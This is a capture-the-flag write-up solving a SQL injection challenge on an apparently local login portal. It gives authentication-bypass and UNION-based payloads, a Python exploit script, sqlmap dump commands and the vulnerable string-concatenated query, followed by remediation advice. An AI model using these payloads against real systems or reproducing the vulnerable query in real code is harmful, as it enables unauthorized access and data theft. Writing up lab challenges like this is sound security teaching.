# SQL Injection 101 - Write-up

**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `CTF{sql_1nj3ct10n_m4st3r_2024}`

## Challenge Description

A "Secure Login Portal" claims to have enterprise-grade security. Our task is to bypass authentication and retrieve the admin flag.

> "Welcome to the ultra-secure login system. Only authorized personnel allowed!"

## Initial Reconnaissance

### Step 1: Understanding the Application

First, I accessed the web application and observed a simple login form with username and password fields. The page title mentions "Secure Login Portal" with a version number, suggesting this might be a custom application.

### Step 2: Testing for SQL Injection

I started with basic SQL injection tests in the username field:

**Test 1: Single Quote**
```
Username: '
Password: anything
```

**Result:** Database error message displayed:
```
Database error: near "'": syntax error
```

This is a strong indicator of SQL injection vulnerability. The application is likely using string concatenation to build SQL queries.

## Vulnerability Analysis

### Understanding the Query Structure

Based on the error message, I inferred the query structure:
```sql
SELECT * FROM users WHERE username = '{input}' AND password = '{input}'
```

The single quote broke the query syntax, confirming injection is possible.

### Step 3: Authentication Bypass

**Attack Strategy:** Comment out the rest of the query to bypass password check.

**Payload:**
```
Username: admin'--
Password: anything
```

This transforms the query to:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The `--` comments out everything after, effectively removing the password check.

**Result:** Login successful, but message says "you're not admin!"

Interesting! The application checks a `role` column. Let's investigate further.

## Database Enumeration

### Step 4: Extracting Database Information

**UNION-based Injection:**

First, I needed to determine the number of columns:
```
Username: ' UNION SELECT 1,2,3,4--
```

The query succeeded, confirming 4 columns in the users table.

### Step 5: Extracting All Data

**Enumerating Tables:**
```
Username: ' UNION SELECT 1,name,sql,4 FROM sqlite_master WHERE type='table'--
```

This revealed two tables:
- `users` (id, username, password, role)
- `secrets` (id, name, value)

### Step 6: Extracting the Flag

**Final Payload:**
```
Username: ' UNION SELECT 1,value,3,4 FROM secrets WHERE name='flag'--
```

**Alternative - Direct Extraction:**

Since we need admin access to display the flag through normal flow, let's try a different approach:

```
Username: admin' OR '1'='1'--
Password: x
```

Or more elegantly:
```
Username: ' OR 1=1--
Password: x
```

This returns the first row, but we need the admin specifically. Let's check the role column:

```
Username: ' UNION SELECT id,username,password,'administrator' FROM users WHERE username='admin'--
Password: x
```

This crafts a fake result row with the admin user but with administrator role.

## Solution Scripts

### Python Exploit Script

```python
#!/usr/bin/env python3
"""
SQL Injection 101 - Automated Solution
"""
import requests

target_url = "http://localhost:5000"

def exploit_union_injection():
    """Extract flag using UNION-based injection"""

    # Payload to extract flag from secrets table
    payload = "' UNION SELECT 1,value,3,4 FROM secrets WHERE name='flag'--"

    response = requests.post(target_url, data={
        'username': payload,
        'password': 'x'
    })

    if 'CTF{' in response.text:
        # Extract flag using string parsing
        start = response.text.find('CTF{')
        end = response.text.find('}', start) + 1
        flag = response.text[start:end]
        print(f"[+] Flag found: {flag}")
        return flag
    else:
        print("[-] Flag not found in response")
        return None

def exploit_auth_bypass():
    """Bypass authentication to get admin access"""

    # Payload to bypass authentication and get admin role
    payload = "' UNION SELECT 1,2,3,'administrator' FROM users WHERE username='admin'--"

    response = requests.post(target_url, data={
        'username': payload,
        'password': 'x'
    })

    if 'CTF{' in response.text:
        start = response.text.find('CTF{')
        end = response.text.find('}', start) + 1
        flag = response.text[start:end]
        print(f"[+] Flag found via auth bypass: {flag}")
        return flag
    return None

if __name__ == '__main__':
    print("[*] SQL Injection 101 - Exploit")
    print("[*] Target: " + target_url)

    print("\n[+] Attempting UNION-based injection...")
    exploit_union_injection()

    print("\n[+] Attempting authentication bypass...")
    exploit_auth_bypass()
```

### SQLMap Automation

```bash
# List databases
sqlmap -u "http://localhost:5000" --data="username=admin&password=test" --dbs

# Dump secrets table
sqlmap -u "http://localhost:5000" --data="username=admin&password=test" -D main -T secrets --dump
```

## Key Takeaways

### Why This Vulnerability Exists

The vulnerable code uses string formatting to build SQL queries:
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

User input is directly concatenated into the SQL query without sanitization.

### Remediation

**Use Parameterized Queries:**
```python
# SAFE: Parameterized query
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

**Additional Protections:**
1. Input validation and sanitization
2. Principle of least privilege for database users
3. Web Application Firewall (WAF)
4. Error handling that doesn't expose database information

## Attack Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Single quote test | Confirmed SQL injection |
| 2 | Comment injection (`--`) | Bypassed password check |
| 3 | UNION injection | Enumerated database structure |
| 4 | Extract secrets table | Retrieved the flag |

## Tools Used

- **Burp Suite** - Request interception and manipulation
- **curl** - Command-line testing
- **sqlmap** - Automated SQL injection
- **Python requests** - Custom exploit development

## Lessons Learned

1. **Always test input fields** with special characters
2. **Error messages can leak information** about the application
3. **UNION-based injection** is powerful for data extraction
4. **Parameterized queries** are essential for secure applications

---

*Solved on first attempt using manual techniques, automated with Python script.*
